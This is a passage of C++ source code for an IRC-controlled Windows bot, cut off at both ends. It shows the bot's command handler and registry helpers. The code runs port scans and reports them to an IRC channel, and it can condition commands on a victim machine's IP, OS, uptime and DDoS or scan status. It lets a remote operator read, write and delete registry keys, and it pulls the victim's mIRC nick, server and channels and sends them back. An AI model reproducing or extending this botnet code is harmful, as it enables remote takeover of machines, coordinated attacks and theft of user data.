						irc->privmsg(hostd->target,"%s %s Port Scan started on %s:%d with a delay of %d seconds for %d minutes using %d threads.", scan_title,((advscan.random)?("Random"):("Sequential")), advscan.ip, advscan.port, advscan.delay, advscan.minutes, advscan.threads);
				}
				else
				{
					if (!switches.silent)
						irc->privmsg(hostd->target,"%s Failed to start scan thread, error: <%d>.", scan_title, GetLastError());
				}
			}
		}
		return 1;
	}
#endif // NO_ADVSCAN


	//////////////////////////////////////////////////////////////////////////////
	//								If/Else
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_IFELSE
	//.if/else nick <nick> <do this> (wildcards supported)
	//.if/else host <host> <do this> (wildcards supported)
	//.if/else id <bot id> <do this>
	//.if/else private <do this>
	//.if/else dialup <do this>
	//.if/else up <time> <do this>
	//.if/else connected <time> <do this>
	//.if/else rup <time> <do this>
	//.if/else os <os> <do this>
	//.if/else exip <ip> <do this> (wildcards supported)
	//.if/else inip <ip> <do this> (wildcards supported)
	//FIXME:.if/else space <free/total> <>space> <gb/mb/kb> <do this>
	else if (!lstrcmpi(cmd_if_1,a[0])
			|| !lstrcmpi(cmd_else_1,a[0]))
	{

		if (!a[1] || !a[2])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,logic_title);
			return 1;
		}

		int anum=3;//param the command starts at
		BOOL bIf=FALSE;
		BOOL bElse=FALSE;
		if (!lstrcmpi(cmd_if_1,a[0]))
			bIf=TRUE;
		if (!lstrcmpi(cmd_else_1,a[0]))
			bElse=TRUE;

		//nick
		if (!lstrcmpi(cmd_ifelse_nick_1,a[1]))
		{
			if (bIf)
				if (strstr(a[2],"*") || strstr(a[2],"?"))
				{
					if (!wildcardfit(_strlwr(a[2]),_strlwr(irc->current_nick())))
						return 1;
				}
				else
				{
					if (lstrcmpi(a[2],irc->current_nick()))
						return 1;
				}

			if (bElse)
				if (strstr(a[2],"*") || strstr(a[2],"?"))
				{
					if (wildcardfit(_strlwr(a[2]),_strlwr(irc->current_nick())))
						return 1;
				}
				else
				{
					if (!lstrcmpi(a[2],irc->current_nick()))
						return 1;
				}
		}
		
		//host
		else if (!lstrcmpi(cmd_ifelse_host_1,a[1]))
		{
#ifndef NO_GET_IP_HTTP
			if (!exip || !strcmp(exip,"") || PrivateIP(exip))
			{
				if (!switches.silent && switches.verbose)
					irc->privmsg(hostd->target,"%s Trying to get external IP.",logic_title);
				DWORD id;
				HANDLE th;
				th=CreateThread(NULL, 0, &GetExIP, NULL, 0, &id);
				WaitForSingleObject(th,5000);
				CloseHandle(th);
			}
#endif
			if (bIf)
				if (strstr(a[2],"*") || strstr(a[2],"?"))
				{
					if (!wildcardfit(_strlwr(a[2]),_strlwr(host)))
						return 1;
				}
				else
				{
					if (lstrcmpi(a[2],host))
						return 1;
				}

			if (bElse)
				if (strstr(a[2],"*") || strstr(a[2],"?"))
				{
					if (wildcardfit(_strlwr(a[2]),_strlwr(host)))
						return 1;
				}
				else
				{
					if (!lstrcmpi(a[2],host))
						return 1;
				}
		}
		
		//botid
		else if (!lstrcmpi(cmd_ifelse_id,a[1]))
		{
			if (bIf)
				if (lstrcmpi(a[2],botid))
					return 1;

			if (bElse)
				if (!lstrcmpi(a[2],botid))
					return 1;
		}
		
		//uptime
		else if (!lstrcmpi(cmd_ifelse_uptime_1,a[1]))
		{
			unsigned int up=GetTickCount()/86400000;

			if (bIf)
				if (up<atoi(a[2]))
					return 1;

			if (bElse)
				if (up>atoi(a[2]))
					return 1;
		}
		
		//connected
		else if (!lstrcmpi(cmd_ifelse_connected,a[1]))
		{
			DWORD dwTotal=(GetTickCount()/1000)-(dwconnected/1000);
			DWORD dwMins=((dwTotal%86400)%3600)/60;
		
			if (bIf)
				if (dwMins<atoi(a[2]))
					return 1;

			if (bElse)
				if (dwMins>atoi(a[2]))
					return 1;
		}
		
#ifndef NO_RECORD_UPTIME
		//uptime
		else if (!lstrcmpi(cmd_ifelse_ruptime_1,a[1]))
		{
			DWORD up=GetRecord()/86400000;
			if (bIf)
				if (up<atoi(a[2]))
					return 1;
				
			if (bElse)
				if (up>atoi(a[2]))
					return 1;
		}
#endif
		
		//private
		else if (!lstrcmpi(cmd_ifelse_priv_1,a[1]))
		{
			anum=2;
			if (bIf)
				if (!PrivateIP(inip))
					return 1;

			if (bElse)
				if (PrivateIP(inip))
					return 1;
		}
		
		//dialup
		else if (!lstrcmpi("dialup",a[1]) || !lstrcmpi("d",a[1]))
		{
			anum=2;
			if (!nowininet)
			{
				DWORD n;
				fInternetGetConnectedStateEx(&n, 0, 0, 0);
				if (n & INTERNET_CONNECTION_MODEM == INTERNET_CONNECTION_MODEM)
				{
					if (bElse)
						return 1;
				}
				else
					if (bIf)
						return 1;
			}
			else
				return 1;
		}

		//status
		else if (!lstrcmpi(cmd_ifelse_status_1,a[1]))
		{
			if (bIf)
			{
				if (!lstrcmpi("scan",a[2]))
					if (!findthreadid(SCAN_THREAD))
						return 1;

				else if (!lstrcmpi("ddos",a[2]))
					if (!findthreadid(DDOS_THREAD))
						return 1;

				else if (!lstrcmpi("idle",a[2]))
					if (findthreadid(DDOS_THREAD) || findthreadid(DDOS_THREAD))
						return 1;
			}
			if (bElse)
			{
				if (!lstrcmpi("scan",a[2]))
					if (findthreadid(SCAN_THREAD))
						return 1;

				else if (!lstrcmpi("ddos",a[2]))
					if (findthreadid(DDOS_THREAD))
						return 1;

				else if (!lstrcmpi("idle",a[2]))
					if (!findthreadid(DDOS_THREAD) && !findthreadid(DDOS_THREAD))
						return 1;
			}
		}

		//os
		else if (!lstrcmpi("os",a[1]))
		{
			OSVERSIONINFO verinf;
			verinf.dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
			if (GetVersionEx(&verinf))
			{
				if (bIf)
				{
					if (!lstrcmpi("95",a[2]))
					{
						if (!(verinf.dwMajorVersion==4 && verinf.dwMinorVersion==0))
							return 1;
						if (verinf.dwPlatformId!=VER_PLATFORM_WIN32_WINDOWS)
							return 1;
					}
					else if (!lstrcmpi("nt",a[2]))
					{
						if (!(verinf.dwMajorVersion==4 && verinf.dwMinorVersion==0))
							return 1;
						if (verinf.dwPlatformId!=VER_PLATFORM_WIN32_NT)
							return 1;
					}
					else if (!lstrcmpi("98",a[2]))
					{
						if (!(verinf.dwMajorVersion==4 && verinf.dwMinorVersion==10))
							return 1;
					}
					else if (!lstrcmpi("me",a[2]))
					{
						if (!(verinf.dwMajorVersion==4 && verinf.dwMinorVersion==90))
							return 1;
					}
					else if (!lstrcmpi("2k",a[2]))
					{
						if (!(verinf.dwMajorVersion==5 && verinf.dwMinorVersion==0))
							return 1;
					}
					else if (!lstrcmpi("xp",a[2]))
					{
						if (!(verinf.dwMajorVersion==5 && verinf.dwMinorVersion==1))
							return 1;
					}
					else if (!lstrcmpi("2k3",a[2]))
					{
						if (!(verinf.dwMajorVersion==5 && verinf.dwMinorVersion==2))
							return 1;
					}
				}
				if (bElse)
				{
					if (lstrcmpi("95",a[2]))
					{
						if (verinf.dwMajorVersion==4 && verinf.dwMinorVersion==0)
						{
							if (verinf.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS)
								return 1;
						}
					}
					else if (!lstrcmpi("nt",a[2]))
					{
						if (verinf.dwMajorVersion==4 && verinf.dwMinorVersion==0)
						{
							if (verinf.dwPlatformId==VER_PLATFORM_WIN32_NT)
								return 1;
						}
					}
					else if (!lstrcmpi("98",a[2]))
					{
						if (verinf.dwMajorVersion==4 && verinf.dwMinorVersion==10)
							return 1;
					}
					else if (!lstrcmpi("me",a[2]))
					{
						if (verinf.dwMajorVersion==4 && verinf.dwMinorVersion==90)
							return 1;
					}
					else if (!lstrcmpi("2k",a[2]))
					{
						if (verinf.dwMajorVersion==5 && verinf.dwMinorVersion==0)
							return 1;
					}
					else if (!lstrcmpi("xp",a[2]))
					{
						if (verinf.dwMajorVersion==5 && verinf.dwMinorVersion==1)
							return 1;
					}
					else if (!lstrcmpi("2k3",a[2]))
					{
						if (verinf.dwMajorVersion==5 && verinf.dwMinorVersion==2)
							return 1;
					}
				}
			}
		}

		//inip
		else if (!lstrcmpi("inip",a[1]))
		{
			if (bIf)
				if (strstr(a[2],"*") || strstr(a[2],"?"))
				{
					if (!wildcardfit(a[2],inip))
						return 1;
				}
				else
				{
					if (lstrcmpi(a[2],inip))
						return 1;
				}

			if (bElse)
				if (strstr(a[2],"*") || strstr(a[2],"?"))
				{
					if (wildcardfit(a[2],inip))
						return 1;
				}
				else
				{
					if (!lstrcmpi(a[2],inip))
						return 1;
				}
		}

		//exip
		else if (!lstrcmpi("exip",a[1]))
		{
			if (bIf)
				if (strstr(a[2],"*") || strstr(a[2],"?"))
				{
					if (!wildcardfit(a[2],exip))
						return 1;
				}
				else
				{
					if (lstrcmpi(a[2],exip))
						return 1;
				}

			if (bElse)
				if (strstr(a[2],"*") || strstr(a[2],"?"))
				{
					if (wildcardfit(a[2],exip))
						return 1;
				}
				else
				{
					if (!lstrcmpi(a[2],exip))
						return 1;
				}
		}

		//unknown
		else
		{
			if (!switches.silent && switches.verbose)
				irc->privmsg(hostd->target,"%s Failed to parse command.",logic_title);
			return 1;
		}

		if (!a[anum])
		{ //this is so u can set the needed num of params (for shit like private)
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,logic_title);
			return 1;
		}
		char command[IRCLINE];
		char tbuf[IRCLINE];
		sprintf(command,"%s",a[anum]);
		for (int u=(anum+1);u<t;u++)// add the rest of the params to the file
		{
			if (a[u])
			{
				sprintf(tbuf," %s",a[u]);
				strcat(command,tbuf);
			}
		}
		if (command[0]!=prefix)
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,"%s Failed to parse command.",logic_title);
			return 1;
		}

		int i;
		for (i=0;i<strlen(command);i++)
		{
			//replace _ with - for the new command
			if (command[i]=='_')
				if (command[i-1]==' ')
					command[i]='-';
			//replace + with _ (for double if/else statements)
			if (command[i]=='+')
				if (command[i-1]==' ')
					command[i]='_';
			//replace ^ with + (for triple if/else statements)
			if (command[i]=='^')
				if (command[i-1]==' ')
					command[i]='+';
			//replace ` with ^ (for quadruple if/else statements)
			if (command[i]=='`')
				if (command[i-1]==' ')
					command[i]='^';
		}

		if (switches.verbose)
			irc->privmsg(hostd->target,"%s Should run: \"%s\".",logic_title,command);

		IRC_TempCommand(command,hostd,irc,switches.silent);
		return 1;
	}
#endif // NO_IFELSE

#ifndef NO_SERVICE
/*#ifndef NO_SERVICE_INSTALLER
	//////////////////////////////////////////////////////////////////////////////
	//								Service installer
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_service_1,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,reg_title);
			return 1;
		}
		
		InstallService(a[1]); // displayname, name & srvdesc same as the bot.
		
		if (!switches.silent)
			irc->privmsg(hostd->target,"%s Service installed: %s", reg_title,a[1]);
		return 1;
	}
#endif // NO_SERVICE_INSTALLER*/
#endif NO_SERVICE

#ifndef NO_REGCTRL
	//////////////////////////////////////////////////////////////////////////////
	//								Reg Control
	//////////////////////////////////////////////////////////////////////////////
	//.reg query <type> <root> <subkey> <key>
	//.reg query <root> <subkey>
	//.reg delete <root> <subkey> [key]
	//.reg write <type> <root> <subkey> <key> <value>
	else if (!lstrcmpi(cmd_redctrl_1,a[0]))
	{
		if (!a[1] || !a[2] || !a[3])
		{
			if (!switches.silent)
				irc->privmsg(hostd->target,str_bad_format,reg_title);
			return 1;
		}
		
		// delete
		else if (!lstrcmpi("d",a[1]))
		{
			HKEY root=GetKey(a[2]);
			LPTSTR subkey=a[3];
			LPTSTR key=(a[4]?a[4]:NULL);
			
			int i;
			char replace='_';
			if (switches.replace_char)
					replace=switches.replace_char;

			if (switches.replace_underscores)
			{
				for (i=0;i<strlen(subkey);i++)
					if (subkey[i]==replace)
						subkey[i]=' ';

				if (key)
				{
					for (i=0;i<strlen(key);i++)
						if (key[i]==replace)
							key[i]=' ';
				}
			}

			if (RegDelete(root,subkey,key))
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Erased Key: %s\\%s\\%s",reg_title,a[2],subkey,(key?key:"*"));
			}
			else
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,"%s Failed to erase key: %s\\%s\\%s",reg_title,a[2],subkey,(key?key:"*"));
			}
		}

		// query
		else if (!lstrcmpi("q",a[1]))
		{
			if (!a[4])
			{
				HKEY root=GetKey(a[2]);
				LPTSTR subkey=a[3];
				if (RegQuery(root,subkey,hostd->target,conn))
				{
					irc->privmsg(hostd->target,"%s Done with query: %s\\%s",reg_title,a[2],a[3]);
				}
				else
				{
					irc->privmsg(hostd->target,"%s Failed to query: %s\\%s",reg_title,a[2],a[3]);
				}
				return 1;
			}
			DWORD type=GetType(a[2]);
			HKEY root=GetKey(a[3]);
			LPTSTR subkey=a[4];
			LPTSTR name=NULL;
			
			int i;
			char replace='_';
			if (switches.replace_char)
					replace=switches.replace_char;

			if (switches.replace_underscores)
			{
				for (i=0;i<strlen(subkey);i++)
					if (subkey[i]==replace)
						subkey[i]=' ';
			}

			if (a[5])
			{
				name=a[5];
				if (switches.replace_underscores)
				{
					for (i=0;i<strlen(name);i++)
						if (name[i]==replace)
							name[i]=' ';
				}


				if (type==REG_SZ || type==REG_MULTI_SZ || type==REG_EXPAND_SZ)
				{
					char *tret=RegQuery(root,subkey,name,type);
					if (tret)
					{
						if (type==REG_MULTI_SZ)
						{
							if (!switches.silent)
								irc->privmsg(hostd->target,"%s Displaying: %s\\%s\\%s",reg_title,a[3],a[4],a[5]);
							char* p;
							while (p=strstr(tret,"\n"))
							{
								*p='\0';
								irc->privmsg(hostd->target,"%s",tret);
								tret=p+1;
							}
							irc->privmsg(hostd->target,"%s",tret);//the last line
							if (!switches.silent)
								irc->privmsg(hostd->target,"%s Finished displaying: %s\\%s\\%s",reg_title,a[3],a[4],a[5]);
						}
						else
							irc->privmsg(hostd->target,"%s Query: %s\\%s\\%s: %s",reg_title,a[3],a[4],a[5],tret);
					}
					else
					{
						irc->privmsg(hostd->target,"%s Failed to query: %s\\%s\\%s",reg_title,a[3],a[4],a[5]);
					}
				}
				else if (type==REG_DWORD)
				{
					BOOL bSuc=FALSE;
					DWORD tret=RegQuery(root,subkey,name,bSuc);
					if (bSuc)
					{
						irc->privmsg(hostd->target,"%s Query: %s\\%s\\%s: %d",reg_title,a[3],a[4],a[5],tret);
					}
					else
					{
						irc->privmsg(hostd->target,"%s Failed to query: %s\\%s\\%s",reg_title,a[3],a[4],a[5]);
					}
				}
			}
		}


		//.reg write <type> <root> <subkey> <key> <value>
		else if (!lstrcmpi("w",a[1]))
		{
			if (!a[4] || !a[5] || !a[6])
			{
				if (!switches.silent)
					irc->privmsg(hostd->target,str_bad_format,reg_title);
				return 1;
			}
			DWORD type=GetType(a[2]);
			HKEY root=GetKey(a[3]);
			LPTSTR subkey=a[4];
			LPTSTR name=a[5];
			
			int i;
			char replace='_';
			if (switches.replace_char)
					replace=switches.replace_char;

			if (switches.replace_underscores)
			{
				for (i=0;i<strlen(subkey);i++)
					if (subkey[i]==replace)
						subkey[i]=' ';
				for (i=0;i<strlen(name);i++)
					if (name[i]==replace)
						name[i]=' ';
			}

			if (type==REG_SZ || type==REG_MULTI_SZ || type==REG_EXPAND_SZ)
			{
				if (RegWrite(root,subkey,name,a[6],type))
				{
					if (!switches.silent)
						irc->privmsg(hostd->target,"%s Wrote key: %s\\%s\\%s (%s)",reg_title,a[3],subkey,name,a[6]);
				}
				else
				{
					if (!switches.silent)
						irc->privmsg(hostd->target,"%s Failed to write: %s\\%s\\%s (%s)",reg_title,a[3],subkey,name,a[6]);
				}
			}
			else if (type==REG_DWORD)
			{
				if (RegWrite(root,subkey,name,(DWORD)atoi(a[6])))
				{
					if (!switches.silent)
						irc->privmsg(hostd->target,"%s Successfully wrote: %s\\%s\\%s (%d)",reg_title,a[3],subkey,name,atoi(a[6]));
				}
				else
				{
					if (!switches.silent)
						irc->privmsg(hostd->target,"%s Failed to write: %s\\%s\\%s (%d)",reg_title,a[3],subkey,name,atoi(a[6]));
				}
			}
		}
		return 1;
	}
#endif // NO_REGCTRL

#ifndef NO_MIRCINFO
	else if (!lstrcmpi(cmd_mircinfo_1,a[0]))
	{
		HWND mwnd = fFindWindow("mIRC", NULL);
		if (mwnd)
		{
			HANDLE hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE,0,PAGE_READWRITE,0,4096,"mIRC");
			LPSTR mData = (LPSTR)MapViewOfFile(hFileMap,FILE_MAP_ALL_ACCESS,0,0,0);
			char mircversion[16], mircnick[MAX_NICKLEN], ircserver[MAX_HOSTNAME], ircserverip[MAX_IP], ircport[8], channels[IRCLINE];

			// mirc version
			ZeroMemory(mircversion,sizeof(mircversion));
			sprintf(mData,"$version");
			fSendMessage(mwnd, WM_USER + 201, 1, 0);
			_snprintf(mircversion,sizeof(mircversion),"%s", mData);

			// mirc nick
			ZeroMemory(mircnick,sizeof(mircnick));
			sprintf(mData,"$me");
			fSendMessage(mwnd, WM_USER + 201, 1, 0);
			_snprintf(mircnick,sizeof(mircnick),"%s", mData);

			// irc server
			ZeroMemory(ircserver,sizeof(ircserver));
			sprintf(mData,"$server");
			fSendMessage(mwnd, WM_USER + 201, 1, 0);
			_snprintf(ircserver,sizeof(ircserver),"%s", mData);

			// irc serverip
			ZeroMemory(ircserverip,sizeof(ircserverip));
			sprintf(mData,"$serverip");
			fSendMessage(mwnd, WM_USER + 201, 1, 0);
			_snprintf(ircserverip,sizeof(ircserverip),"%s", mData);

			// irc port
			ZeroMemory(ircport,sizeof(ircport));
			sprintf(mData, "$port");
			fSendMessage(mwnd, WM_USER + 201, 1, 0);
			_snprintf(ircport,sizeof(ircport),"%s", mData);

			// channels
			ZeroMemory(channels,sizeof(channels));
			char numchans[16];
			sprintf(mData,"$chan(0)");
			fSendMessage(mwnd,WM_USER + 201,1,0);
			_snprintf(numchans,sizeof(numchans),mData);
			for (int i=1;i <= atoi(numchans);i++) {
				sprintf(mData,"$chan(%i)",i);
				fSendMessage(mwnd,WM_USER + 201,1,0);
 				strcat(channels,mData);
 				if (i < atoi(numchans)) strcat(channels,", ");
				if (i == atoi(numchans)) strcat(channels,".");
			}

			irc->privmsg(hostd->target,"%s User is running mIRC %s, connected to %s (%s:%s) using the nick: %s, on channels: %s", mirc_title, mircversion, ircserver, ircserverip, ircport, mircnick, channels);
			UnmapViewOfFile(mData);
			CloseHandle(hFileMap);
		}
		else
			if (!switches.silent && switches.verbose)
				irc->privmsg(hostd->target,"%s Client not open.",mirc_title);

		return 1;
	}
#endif

	return 0;
}


HKEY GetKey(char *skey)
{
	if (!strcmp("HKEY_LOCAL_MACHINE",skey) || !strcmp("HKLM",skey))
		return HKEY_LOCAL_MACHINE;
	
	else if (!strcmp("HKEY_CURRENT_USER",skey) || !strcmp("HKCU",skey))
		return HKEY_CURRENT_USER;
	
	else if (!strcmp("HKEY_CLASSES_ROOT",skey) || !strcmp("HKCR",skey))
		return HKEY_CLASSES_ROOT;
	
	else if (!strcmp("HKEY_CURRENT_CONFIG",skey) || !strcmp("HKCC",skey))
		return HKEY_CURRENT_CONFIG;
	
	else if (!strcmp("HKEY_USERS",skey) || !strcmp("HKU",skey))
		return HKEY_USERS;
	
	return HKEY_LOCAL_MACHINE;
}

char *GetKey(HKEY root,BOOL sh)
{
	if (root==HKEY_LOCAL_MACHINE)
		if (!sh)
			return "HKEY_LOCAL_MACHINE";
		else
			return "HKLM";
	
	else if (root==HKEY_CURRENT_USER)
		if (!sh)
			return "HKEY_CURRENT_USER";
		else
			return "HKCU";
	
	else if (root==HKEY_CLASSES_ROOT)
		if (!sh)
			return "HKEY_CLASSES_ROOT";
		else
			return "HKCR";
	
	else if (root==HKEY_CURRENT_CONFIG)
		if (!sh)
			return "HKEY_CURRENT_CONFIG";
		else
			return "HKCC";
	
	else if (root==HKEY_USERS)
		if (!sh)
			return "HKEY_USERS";
		else
			return "HKU";
	
	if (!sh)
		return "HKEY_LOCAL_MACHINE";
	else
		return "HKLM";
}

DWORD GetType(char *key)
{
	if (!lstrcmpi(key,"REG_SZ") || !lstrcmpi(key,"SZ"))
		return REG_SZ;
	
	if (!lstrcmpi(key,"REG_EXPAND_SZ") || !lstrcmpi(key,"EX"))
		return REG_EXPAND_SZ;
	
	if (!lstrcmpi(key,"REG_MULTI_SZ") || !lstrcmpi(key,"MU"))
		return REG_MULTI_SZ;
	
	if (!lstrcmpi(key,"REG_DWORD") || !lstrcmpi(key,"DW"))
		return REG_DWORD;
	
	return REG_SZ;
}

char *GetType(DWORD type)
{
	switch (type)
	{
	case REG_SZ:
		return "REG_SZ";
		break;
	case REG_DWORD:
		return "REG_DWORD";
		break;
	case REG_EXPAND_SZ:
		return "REG_EXPAND_SZ";
		break;
	case REG_MULTI_SZ:
		return "REG_MULTI_SZ";
		break;
	case REG_BINARY:
		return "REG_BINARY";
		break;
	//case REG_DWORD_LITTLE_ENDIAN:
	//	return "REG_DWORD_LITTLE_ENDIAN";
	//	break;
	case REG_DWORD_BIG_ENDIAN:
		return "REG_DWORD_BIG_ENDIAN";
		break;
	case REG_LINK:
		return "REG_LINK";
		break;
	case REG_NONE:
		return "REG_NONE";
		break;
	case REG_QWORD:
		return "REG_QWORD";
		break;
	//case REG_QWORD_LITTLE_ENDIAN:
	//	return "REG_QWORD_LITTLE_ENDIAN";
	//	break;
	default:
		return "UNKNOWN";
		break;
	}
}

BOOL RegDelete(HKEY root,LPCTSTR subkey,LPCTSTR name)
{
	HKEY key=NULL;
	if (!subkey)
		return FALSE;

	if (!name)
	{
		if (fRegDeleteKey(root,subkey) == ERROR_SUCCESS) 
			return TRUE;
		
		DWORD inx = 0;
		DWORD chr = 256;
		char buf[256] = {0};
		FILETIME ftm;
		
		if (fRegOpenKeyEx(root,subkey,0,KEY_READ|KEY_WRITE,&key) == ERROR_SUCCESS)
		{
			DWORD cnt = fRegEnumKeyEx(key,inx,buf,&chr,NULL,NULL,NULL,&ftm);
			while ((cnt != ERROR_NO_MORE_ITEMS) && (cnt == ERROR_SUCCESS)) {
				RegDelete(root,subkey,buf);
				cnt = fRegEnumKeyEx(key,(inx++),buf,&chr,NULL,NULL,NULL,&ftm);
			}
			
			fRegDeleteKey(key,subkey);
		}
	}
	else
	{
		if (fRegOpenKeyEx(root,subkey,0,KEY_READ|KEY_WRITE,&key) == ERROR_SUCCESS)
		{
			if (fRegDeleteValue(key,name) == ERROR_SUCCESS)
			{
				fRegCloseKey(key);
				return TRUE;
			}
			fRegCloseKey(key);
		}
	}

	return FALSE;
}

BOOL RegExists(HKEY root,LPCTSTR subkey,char *name,DWORD type)
{
	BOOL bRet=FALSE;
	HKEY key=NULL;
	if (!subkey || !name)
		return bRet;
	if (fRegOpenKeyEx(root,subkey,0,KEY_READ|KEY_WRITE,&key) == ERROR_SUCCESS)
	{
		if (type==REG_DWORD)
		{
			BOOL success=FALSE;
			DWORD dwRet=RegQuery(root,subkey,name,&success);
			if (success)
				bRet=TRUE;
			else
				bRet=FALSE;
		}
		else if (type==REG_SZ || type==REG_EXPAND_SZ || type==REG_MULTI_SZ)
		{
			char *szRet=RegQuery(root,subkey,name,REG_SZ);
			if (szRet)
				bRet=TRUE;
			else
				bRet=FALSE;
		}
		fRegCloseKey(key);
	}
	return bRet;
}

BOOL RegQuery(HKEY root,LPCTSTR subkey,char *target,void *conn)
{
	IRC* irc=(IRC*)conn;
	HKEY key=NULL;
	DWORD dwRet; 
	DWORD cSubKeys=0;// number of subkeys 
	DWORD cValues;// number of values for key 
	DWORD dwMaxSubKey;// longest subkey size 
	DWORD dwMaxClass;// longest class string 
	DWORD dwMaxValue;// longest value name 
	DWORD dwMaxValueData;// longest value data 
	DWORD dwsd;// size of security descriptor 
	
	char szKeyName[MAX_KEY_LENGTH];
	DWORD dwKeySize=MAX_KEY_LENGTH;
	TCHAR  szValueName[MAX_VALUE_NAME];
	DWORD dwValueSize=MAX_VALUE_NAME;
	DWORD dwValueType;

	char szKeyClass[128];
	DWORD dwClassSize=sizeof(szKeyClass);
	
	FILETIME lpft;
	int i;
	int isent=0;
	//static char szRegBuffer[65535+2];
	//ZeroMemory(szRegBuffer,65535);
    
	if(fRegOpenKeyEx(root,subkey,0,KEY_ALL_ACCESS,&key) == ERROR_SUCCESS)
	{
		// Get the class name and the value count. 
		dwRet=fRegQueryInfoKey(key,szKeyClass,&dwClassSize,NULL,&cSubKeys,&dwMaxSubKey,
			&dwMaxClass,&cValues,&dwMaxValue,&dwMaxValueData,&dwsd,&lpft);
		
		int t=0;
		// Enumerate the subkeys
		if (cSubKeys)
		{
			//irc->privmsg(target,"%s Number of subkeys: %d",reg_title,cSubKeys);
			for (i=0; i<cSubKeys; i++,t++) 
			{ 
				dwKeySize=MAX_KEY_LENGTH;
				dwRet=fRegEnumKeyEx(key,i,szKeyName,&dwKeySize,NULL,NULL,NULL,&lpft); 
				if (dwRet == ERROR_SUCCESS) 
				{
					irc->privmsg(target,"(%.2d) %s\\%s",t+1,subkey,szKeyName);
					isent++;
				}
			}
		} 

		
		// Enumerate the key values. 
		if (cValues) 
		{
			//irc->privmsg(target,"Number of values: %d",cValues);
			for (i=0, dwRet=ERROR_SUCCESS; i<cValues; i++,t++) 
			{
				dwValueSize=MAX_KEY_LENGTH;
				szValueName[0] = '\0'; 
				dwRet=fRegEnumValue(key,i,szValueName,&dwValueSize,NULL,&dwValueType,NULL,NULL);
				if (dwRet == ERROR_SUCCESS) 
				{
					if (!strcmp(szValueName,"") && dwValueType==REG_SZ)
						sprintf(szValueName,"(Default)");
					irc->privmsg(target,"(%.2d) %s\\%s (%s)",t+1,subkey,szValueName,GetType(dwValueType));
					isent++;
				}
			}
		}

		fRegCloseKey(key);
	}
	else
		return FALSE;
	if (isent>0)
		return TRUE;
	return FALSE;
}

DWORD RegQuery(HKEY root,LPCTSTR subkey,LPCTSTR name,BOOL &success)
{	
	HKEY key=NULL;
	DWORD dwType=REG_DWORD,dwSize=sizeof(DWORD),dwRead=0;
	if(fRegOpenKeyEx(root,subkey,0,KEY_ALL_ACCESS,&key)==ERROR_SUCCESS)
	{
		if(fRegQueryValueEx(key,name,NULL,&dwType,(LPBYTE)&dwRead,&dwSize)==ERROR_SUCCESS)
		{
			fRegCloseKey(key);
			success=TRUE;
			return dwRead;
		}
		fRegCloseKey(key);
	}
	success=FALSE;
	return 0;
}

char *RegQuery(HKEY root,LPCTSTR subkey,LPCTSTR name,DWORD type/*=REG_SZ*/)
{	
	HKEY key=NULL;
	DWORD dwRes=65535;
	static char szRegBuffer[65535+2];
	ZeroMemory(szRegBuffer,65535);
	if(fRegOpenKeyEx(root,subkey,0,KEY_ALL_ACCESS,&key) == ERROR_SUCCESS)
	{
		if(fRegQueryValueEx(key,name,NULL,NULL,(unsigned char *)szRegBuffer,&dwRes) == ERROR_SUCCESS)
		{
			if (type==REG_MULTI_SZ)
			{
				szRegBuffer[dwRes] = '\0';	// Ensure termination

				// Skip back through ALL the null chars first
				while (szRegBuffer[dwRes]=='\0' && dwRes != 0)
					--dwRes;

				for (unsigned int i=0; i<dwRes; ++i)
				{
					if (szRegBuffer[i]=='\0')
						szRegBuffer[i]='\n'; // Convert to \n
				}
			}
			fRegCloseKey(key);
			return szRegBuffer;
		}
		fRegCloseKey(key);
	}
	return '\0';
}

BOOL RegWrite(HKEY root,char *subkey,char *name,DWORD data)
{	
	RQUERY rq;
	rq.dwQuery=data;
	return RegWrite(root,subkey,name,REG_DWORD,rq);
}

BOOL RegWrite(HKEY root,char *subkey,char *name,char *data,DWORD type/*=REG_SZ*/)
{	
	RQUERY rq;
	BOOL bret=FALSE;

	rq.szQuery=data;
	
	if (type==REG_SZ)
		bret=RegWrite(root,subkey,name,REG_SZ,rq);

	else if (type==REG_EXPAND_SZ)
		bret=RegWrite(root,subkey,name,REG_EXPAND_SZ,rq);

	else if (type==REG_MULTI_SZ)
		bret=RegWrite(root,subkey,name,REG_MULTI_SZ,rq);

	else
		bret=FALSE;
	
	return bret;
}

BOOL RegWrite(HKEY hKey,LPCTSTR SubKey,LPCTSTR KeyName,DWORD Type,RQUERY Data)
{
	HKEY	hRegKey;
	DWORD	dwBuf;
	char	szRegBuffer[65535+2]; // Only allow writing of 64Kb to a key, include space for double null
	int		i, nLen;

	// Open the registry key
	if (fRegCreateKeyEx(hKey,SubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_WRITE,NULL,&hRegKey,NULL) != ERROR_SUCCESS)
	{
		return FALSE;
	}

	// If no keyname then we are finished
	if (KeyName == 0)
	{
		fRegCloseKey(hRegKey);
		return TRUE;
	}

	// Write the registry differently depending on type of variable we are writing
	switch (Type)
	{

	case REG_EXPAND_SZ:
		nLen=(int)strlen(Data.szQuery);
		strcpy(szRegBuffer,Data.szQuery);
		if (fRegSetValueEx(hRegKey,KeyName,0,REG_EXPAND_SZ,(CONST BYTE *)szRegBuffer,(DWORD)nLen+1) != ERROR_SUCCESS)
		{
			fRegCloseKey(hRegKey);
			return FALSE;
		}

		break;

	case REG_SZ:
		nLen=(int)strlen(Data.szQuery);
		strcpy(szRegBuffer,Data.szQuery);
		if (fRegSetValueEx(hRegKey,KeyName,0,REG_SZ,(CONST BYTE *)szRegBuffer,(DWORD)nLen+1) != ERROR_SUCCESS)
		{
			fRegCloseKey(hRegKey);
			return FALSE;
		}

		break;

	case REG_DWORD:
		dwBuf=Data.dwQuery;
		if (fRegSetValueEx(hRegKey,KeyName,0,REG_DWORD,(CONST BYTE *)&dwBuf,sizeof(dwBuf)) != ERROR_SUCCESS)
		{
			fRegCloseKey(hRegKey);
			return FALSE;
		}

		break;

	case REG_MULTI_SZ:
		nLen=(int)strlen(Data.szQuery);	
